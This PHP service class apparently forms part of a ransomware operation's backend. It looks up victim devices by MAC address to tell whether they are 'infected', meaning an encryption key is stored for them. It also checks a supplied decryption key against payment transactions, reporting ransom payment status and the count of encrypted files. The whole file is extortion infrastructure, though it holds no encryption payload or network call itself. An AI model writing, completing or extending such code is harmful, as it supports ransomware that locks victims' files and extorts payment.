<?php

namespace App\Service\API;

use App\Repository\LogRepository;
use App\Repository\TransactionRepository;
use App\Repository\UserRepository;

class UserService {
    /**
     * @var UserRepository
     */
    private UserRepository $userRepository;

    /**
     * @var TransactionRepository
     */
    private TransactionRepository $transactionRepository;

    /**
     * @var LogRepository
     */
    private LogRepository $logRepository;

    public function __construct(UserRepository $userRepository, TransactionRepository $transactionRepository, LogRepository $logRepository)
    {
        $this->userRepository = $userRepository;
        $this->transactionRepository = $transactionRepository;
        $this->logRepository = $logRepository;
    }

    /**
     * Check if device is infected
     * @param string $macAddress
     * @return bool
     */
    public function isInfected(string $macAddress): bool {
        $user = $this->userRepository->findOneBy(['macAddress' => $macAddress]);
        if (!$user) {
            return false;    
        }
        if ($user->getEncryptionKey() !== null) {
            return true;
        }
        return false;
    }

    public function isPaied(string $decryptKey): array {
        $array = [
            'is_paied' => false,
        ];
        $user = $this->userRepository->findOneBy(['encryptionKey' => $decryptKey]);
        if (!$user) {
            return $array;
        }
        $transaction = $this->transactionRepository->findOneBy(['user' => $user]);
        if (!$transaction) {
            return $array;
        }
        if ($transaction->getPaymentStatus() === 'payment_success') {
            $log = $this->logRepository->findOneBy(['user' => $user], ['id' => 'DESC']);
            $array['infected_files'] = $log->getNumberInfectedFile();
            $array['is_paied'] = true;
            return $array;
        } else {
            return $array;
        }
    }
}
